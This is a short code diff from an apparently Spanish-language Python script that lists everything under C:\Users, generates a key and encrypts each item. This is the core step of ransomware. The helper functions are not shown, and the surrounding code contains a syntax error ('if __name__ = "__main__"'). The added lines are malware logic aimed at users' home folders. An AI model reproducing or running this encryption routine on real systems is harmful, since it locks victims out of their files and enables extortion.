@@ -35,4 +35,10 @@ if __name__ = "__main__":
 
      #En la siguiente linea se debe de escribir la ruta de los archivos a encryptar
      archivos = 'C:\\Users'
+     items = os.listdir(archivos)
+     archivos_2 = [archivos + "\\" + x for x in items ]
 
+generateKey()
+key = retornarkey()
+
+encryp(archivos_2)
